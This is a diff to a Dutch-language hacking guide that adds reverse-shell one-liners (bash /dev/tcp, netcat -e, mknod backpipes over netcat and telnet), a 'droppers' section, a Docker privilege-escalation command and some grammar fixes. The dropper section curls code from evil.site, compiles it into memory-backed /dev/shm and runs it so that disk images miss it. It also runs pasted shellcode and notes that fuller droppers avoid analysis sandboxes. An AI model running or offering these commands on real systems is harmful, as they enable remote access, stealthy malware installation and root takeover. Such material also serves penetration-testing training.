@@ -31,7 +31,7 @@ Binnen HTTP verstuurt een gebruiker een verzoek naar een webserver, dit verzoek 
     Accept-Language: en
      
     
-In het bovengenoemde verzoek is GET de methode waarmee je een pagina opvraagt, daarachter staat de URI die je wilt opvragen en dan het protocol met de versienummer. Het User-Agent gedeelte is de browser die iemand gebruikt en de host het internet adres die een eindgebruiker wil bezoeken. Al deze velden kan jij als eindgebruiker beïnvloeden. Er bestaan overigens nog meer velden, maar daarvoor verwijs ik je graag naar de RFC zoals hierboven vermeld.
+In het bovengenoemde verzoek is GET de methode waarmee je een pagina opvraagt, daarachter staat de URI die je wilt opvragen en dan het protocol met het versienummer. Het User-Agent gedeelte is de browser die iemand gebruikt en de host het internet adres die een eindgebruiker wil bezoeken. Al deze velden kan jij als eindgebruiker beïnvloeden. Er bestaan overigens nog meer velden, maar daarvoor verwijs ik je graag naar de RFC zoals hierboven vermeld.
 Als reactie hierop stuurt de server het volgende antwoord:
 
     HTTP/1.1 200 OK
@@ -112,14 +112,33 @@ Hieronder zal ik er een aantal plaatsen:
     exec /bin/bash 0&0 2>&0 
     bash -i >& /dev/tcp/< ip >/< port > 0>&1
 
+Mocht dit problemen geven probeer dan
+
+    /bin/bash -i > /dev/tcp/< ip >/< port > 0<&1 2>&1
+
 ### Java
     r = Runtime.getRuntime()
     p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/< ip >/< port >;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
     p.waitFor()
 
 ### Netcat
+Op oudere systemen zul je nog nc applicaties vinden met de [schakeloptie -e](https://explainshell.com/explain?cmd=nc+-e). Deze schakeloptie heeft als voordeel dat je een executable op kan geven welke, na het tot stand komen van een connectie, uitgevoerd zal moeten worden. Het is dan kinderlijk eenvoudig om een reverse shell op te zetten.
 
     nc -e /bin/sh < ip > < port >
+
+Als je niet de beschikking hebt over een ouder systeem en er een modernere netcat beschikbaar is waarin de (onveilige) schakeloptie -e verwijderd is, dan kan je gebruik maken van een zogenaamde backpipe.
+
+    mknod bp p; nc < ip > < port > 0<bp | /bin/bash 1>bp
+
+Je maakt hier een block special file aan met [mknod](http://man7.org/linux/man-pages/man1/mknod.1.html), deze heeft als naam bp en als type p. Het type p betekend dat het een FIFO (first in first out) bestand is, waarbij we de standard output van de commando's van netcat naar /bin/bash terug naar netcat forwarden.
+
+### Telnet ###
+
+Heel af en toe kom je wel eens ene omgeving tegen waarin je geheel geen toegang hebt tot de netcat executable. Nu kun je deze introduceren (en zo extra sporen maken) of je kan gebruik maken van telnet. 
+
+    mknod bp p; telnet < ip > < port > 0<bp | /bin/bash 1>bp
+
+
 
 ### Perl
 
@@ -132,6 +151,21 @@ Hieronder zal ik er een aantal plaatsen:
 ### Ruby ###
 
     ruby -rsocket -e'f=TCPSocket.open("< ip >",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+## Droppers ##
+Soms heb je een specifiek stukje malware wat je op een systeem wilt introduceren. Hiervoor is het niet altijd perse noodzakelijk om een uitgebreide dropper te schrijven. Het kan soms ook al voldoende zijn om met zo min mogelijk sporen datgene wat je wilt introduceren te introduceren. Denk hierbij bijvoorbeeld aan een zelf geschreven backdoor.
+
+Een leuk voorbeeld hiervan is de volgende:
+
+    curl -s https://evil.site/code.c | gcc -o /dev/shm/.a -x c -; /dev/shm/.a; rm /dev/shm/.a
+
+Je download via curl de source code die je nodig hebt, compiled deze met GCC en laat de uitvoer hiervan naar [/dev/shm](https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html) toeschrijven. Aangezien /dev/shm memory mapped is, bestaat deze map eigenlijk alleen in het werkgeheugen van de computer. Na ene reboot is alle inhoud hiervan verdwenen. Mocht iemand een image maken van het filesystem dan zal hij de malware dus ook niet tegenkomen.
+
+Een uitgebreidere dropper zal overigens rekening houden met de omgeving waarin hij werkt. Hij zal controleren of er sprake is van een malware analyse platform, hij in een VM draait of dat er debugging tools actief zijn. Mocht dit allemaal het geval zijn dan zal hij zijn acties niet voortzetten.
+
+Mocht je een handmatige plaatsing als methode willen gebruiken kan je gebruik maken van een code als:
+
+    echo -e "< shellcode >" > /dev/shm/.p; chmod +x /dev/shm/.p;/dev/shm/.p & rm /dev/shm/.p
 
 ## MSFVenom ##
 Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen. Een handige manier om een payload te genereren om in buffer overflows te gebruiken is:
@@ -939,6 +973,14 @@ Hardwarematige DEP is, in Windows, pas geïntroduceerd in [Windows Vista](https:
 ### SSP ###
 
 ### PIE ###
+
+## Privilege escalation ##
+### Docker ###
+Als je een terminal toegang hebt in Docker kan je privilege escalation toepassen door het volgende commando te draaien:
+
+    $> docker run -it --rm -v /:/mnt bash
+
+Omdat Docker altijd als root draait open je nu een bash terminal vanuit het host filesystem als root.
 
 # Dankwoord #
 
